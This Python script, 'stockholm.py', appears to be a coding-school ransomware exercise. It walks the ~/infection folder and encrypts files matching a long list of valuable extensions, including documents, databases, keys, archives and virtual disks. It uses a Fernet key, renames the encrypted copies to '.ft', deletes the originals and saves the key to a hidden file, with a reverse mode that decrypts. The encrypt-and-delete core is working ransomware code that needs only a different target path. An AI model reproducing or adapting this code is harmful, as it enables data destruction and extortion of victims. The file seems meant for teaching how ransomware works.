#!/usr/bin/env python3

import os
import argparse
from cryptography.fernet import Fernet, InvalidToken

# ansi colors
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
ORANGE = "\033[38;5;208m"
RESET = "\033[0m"

extensions = (
    ".der",".pfx",".key",".crt",".csr",
    ".p12",".pem",".odt",".ott",".sxw",
    ".stw",".uot",".3ds",".max",".3dm",
    ".ods",".ots",".sxc",".stc",".dif",
    ".slk",".wb2",".odp",".otp",".sxd",
    ".std",".uop",".odg",".otg",".sxm",
    ".mml",".lay",".lay6",".asc",".h",
    ".sqlitedb",".sql",".accdb",".mdb",
    ".dbf",".odb",".frm",".myd",".myi",
    ".ibd",".mdf",".ldf",".sln",".suo",
    ".cpp",".pas",".asm",".cmd",".bat",
    ".ps1",".vbs",".js",".jar",".java",
    ".class",".sh",".rb",".asp",".php",
    ".jsp",".brd",".sch",".dch",".dip",
    ".pl",".vb",".vbe",".jse",".wsf",".c",
    ".wsh",".ps",".py",".pyc",".pyo",".db",
    ".pyd",".sqlite3",".cs",".resx",".licx",
    ".csproj",".sln",".ico",".png",".jpg",
    ".jpeg",".gif",".bmp",".tif",".tiff",
    ".psd",".ai",".svg",".djvu",".m4u",
    ".m3u",".mid",".wma",".flv",".3g2",
    ".mkv",".3gp",".mp4",".mov",".avi",
    ".asf",".mpeg",".vob",".mpg",".wmv",
    ".fla",".swf",".wav",".mp3",".sh",
    ".zip",".rar",".7z",".tar",".gz",
    ".tgz",".bz2",".bak",".tmp",".iso",
    ".vcd",".dmg",".toast",".vmdk",".vdi",
    ".sparsebundle",".qcow2",".vhd",".vhdx",
    ".csv",".rtf",".txt",".doc",".docx",
    ".docm",".dot",".dotx",".dotm",".xls",
    ".xlsx",".xlsm",".xlsb",".xlt",".xltx",
    ".xltm",".xlw",".ppt",".pptx",".pptm",
    ".pps",".ppsx",".ppsm",".pot",".potx",
    ".potm",".pdf",".epub",".djvu",".xps",
    ".oxps",".onetoc2",".snt",".pst",".ost",
    ".msg",".eml",".vsd",".vsdx",".vss",
    ".vst",".dwg",".dxf",".dxg",".log"
)

def encrypt_all(target_dir, key, silent=False):
    f = Fernet(key)
    count = 0

    for root, dirs, files in os.walk(target_dir):
        for file in files:
            if not file.endswith(".ft") and \
            file != "stockholm.py" and \
            file.endswith(extensions):
                file_path = os.path.join(root, file)

                try:
                    with open(file_path, "rb") as file_data:
                        data = file_data.read()
                    
                    encrypted_data = f.encrypt(data)

                    new_path = file_path + ".ft"
                    with open(new_path, "wb") as file_enc:
                        file_enc.write(encrypted_data)
                    
                    os.remove(file_path)

                    if not silent:
                        print(f"{YELLOW}[INFO] Encrypted: {RESET}{file} -> {file}.ft")
                    count+=1
                
                except Exception as e:
                    print(f"{RED}[CRITICAL] Error on {file}: {RESET}{e}")
    
    if not silent:
        print(f"{CYAN}[INFO] Done! {RESET}{count} files encrypted.")

def decrypt_all(target_dir, key, silent=False):
    try:
        f = Fernet(key)

    except Exception as e:
        print(f"{RED}[ERROR] Invalid format{RESET}")
        return

    if not silent:
        print(f"{CYAN}[INFO] Starting decrypting: {RESET}{target_dir}")

    for root, dirs, files in os.walk(target_dir):
        for file in files:
            if file.endswith(".ft"):
                encrypted_path = os.path.join(root, file)
                original_path = encrypted_path[:-3]
            
                try:
                    with open(encrypted_path, "rb") as file_enc:
                        encrypted_data = file_enc.read()
                    
                    decrypted_data = f.decrypt(encrypted_data)

                    with open(original_path, "wb") as file_orig:
                        file_orig.write(decrypted_data)
                    
                    os.remove(encrypted_path)
                    
                    if not silent:
                        print(f"{GREEN}[INFO] Restored: {RESET}{original_path}")

                except InvalidToken:
                    print(f"{RED}[ERROR] Error: Incorrect key for: {RESET}{file}")

                except Exception as e:
                    print(f"{RED}[ERROR] Error on {RESET}{file}: {e}")
    
    if not silent:
        print(f"{CYAN}[INFO] Operation completed.{RESET}")

def parse_args():
    parser = argparse.ArgumentParser(description="Stockholm project")
    parser.add_argument("-v", "-version", "--version", action="version", version="stockholm 1.0")
    parser.add_argument("-r", "-reverse", "--reverse", help="+ key for decryption", type=str)
    parser.add_argument("-s", "-silent", "--silent", action="store_true", help="enable silent mode")
    return parser.parse_args()

def main():
    args = parse_args()
    target_dir = os.path.expanduser("~/infection")
    
    if not os.path.exists(target_dir):
        print(f"{RED}[ERROR] Directory {target_dir} not found.{RESET}")
        return

    if args.reverse:
        # decryption mode
        key = args.reverse.encode() 
        if not args.silent:
            print(f"{CYAN}[INFO] Trying to decrypt using the giving key: {RESET}{args.reverse}")
        
        decrypt_all(target_dir, key, args.silent)
        os.remove(".infection.key")

    else:
        # encryption mode
        key = Fernet.generate_key()
        if not args.silent:
            print(f"{CYAN}[INFO] Key created (keep it safe): {RESET}{key.decode()}")

        with open(".infection.key", "wb") as key_file:
            key_file.write(key)

        encrypt_all(target_dir, key, args.silent)

if __name__ == "__main__":
    main()
